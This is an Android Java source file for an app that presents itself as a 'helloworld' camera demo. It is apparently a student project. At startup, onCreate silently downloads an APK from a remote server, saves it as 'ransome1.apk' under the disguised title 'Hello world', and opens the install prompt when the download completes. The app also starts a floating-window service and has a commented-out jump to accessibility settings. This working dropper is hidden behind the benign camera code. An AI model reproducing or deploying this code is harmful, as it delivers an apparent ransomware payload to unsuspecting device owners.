package com.example.ralph.helloworld;

import android.app.Activity;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.provider.MediaStore;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    private static final int TAKE_PICTURE = 1;
    private Uri imageUri;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startService(new Intent(MainActivity.this, FloatingWindow.class));

        /* ACCESS Settings accessibility */
        // startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));

        /* Open Camera and take photos */
        Button btn = (Button) findViewById(R.id.btn);
        btn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                takePhoto();
            }
        });

        downloadApp();

    }

    public void downloadApp() {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        String destination = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/";
        String fileName = "ransome1.apk";
        destination += fileName;
        final Uri uri = Uri.parse("file://" + destination);

        //Delete update file if exists
        File file = new File(destination);

        //get url of app on server
        //String url = "https://www.csie.ntu.edu.tw/~b02902031/app/install.apk";
        String url = "https://www.csie.ntu.edu.tw/~b02902027/app-release.apk";

        //set downloadmanager
        DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
        request.setDescription("Downloading");
        request.setTitle("Hello world");

        //set destination
        request.setDestinationUri(uri);

        // get download service and enqueue file
        final DownloadManager manager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
        final long downloadId = manager.enqueue(request);
        //set BroadcastReceiver to install app when .apk is downloaded
        BroadcastReceiver onComplete = new BroadcastReceiver() {
            public void onReceive(Context ctxt, Intent intent) {
                Intent install = new Intent(Intent.ACTION_VIEW);
                install.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                install.setDataAndType(uri,
                        manager.getMimeTypeForDownloadedFile(downloadId));
                startActivity(install);

                unregisterReceiver(this);
                finish();
            }
        };
        //register receiver for when .apk download is compete
        registerReceiver(onComplete, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));
    }

    public void takePhoto() {
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        File photo = new File(Environment.getExternalStoragePublicDirectory( Environment.DIRECTORY_PICTURES),  "pic.jpg");
        Log.v("photo-path", Environment.getExternalStoragePublicDirectory( Environment.DIRECTORY_PICTURES).toString());
        intent.putExtra(MediaStore.EXTRA_OUTPUT,
                Uri.fromFile(photo));
        imageUri = Uri.fromFile(photo);
        startActivityForResult(intent, TAKE_PICTURE);
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case TAKE_PICTURE:
                if (resultCode == Activity.RESULT_OK) {
                    Uri selectedImage = imageUri;
                    getContentResolver().notifyChange(selectedImage, null);
                    ImageView imageView = (ImageView) findViewById(R.id.imageView);
                    ContentResolver cr = getContentResolver();
                    Bitmap bitmap;
                    try {
                        bitmap = android.provider.MediaStore.Images.Media
                                .getBitmap(cr, selectedImage);

                        imageView.setImageBitmap(bitmap);
                        Toast.makeText(this, selectedImage.toString(),
                                Toast.LENGTH_LONG).show();
                    } catch (Exception e) {
                        Toast.makeText(this, "Failed to load", Toast.LENGTH_SHORT)
                                .show();
                        Log.e("Camera", e.toString());
                    }
                }
        }
    }
}
